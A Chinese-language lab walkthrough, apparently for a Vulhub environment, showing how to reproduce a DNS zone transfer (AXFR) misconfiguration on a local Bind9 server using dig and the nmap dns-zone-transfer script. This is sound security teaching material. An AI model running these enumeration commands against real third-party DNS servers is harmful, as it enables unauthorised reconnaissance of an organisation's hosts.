# DNS域传送漏洞

## 环境搭建

Vulhub使用[Bind9](https://wiki.debian.org/Bind9#tdsub)来搭建dns服务器，但不代表只有Bind9支持AXFR记录。运行DNS服务器：

```plain
docker compose up -d
```

环境运行后，将会监听TCP和UDP的53端口，DNS协议同时支持从这两个端口进行数据传输。

## 漏洞复现

在Linux下，我们可以使用dig命令来发送dns请求。比如，我们可以用

```plain
dig @your-ip www.vulhub.org
```

获取域名www.vulhub.org在目标dns服务器上的A记录：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780842068126-526590f3-bb8c-421f-8fe7-f0a5dfe90c96.png)

发送axfr类型的dns请求：

```plain
dig @your-ip -t axfr vulhub.org
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780842068123-d82d74ce-d037-4915-8934-253ae70e06bb.png)

可见，我获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞。

我们也可以用nmap script来扫描该漏洞：

```plain
nmap --script dns-zone-transfer.nse --script-args "dns-zone-transfer.domain=vulhub.org" -Pn -p 53 your-ip
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780842068027-ff1d50b8-c7d5-4c93-a285-3936f9f177b1.png)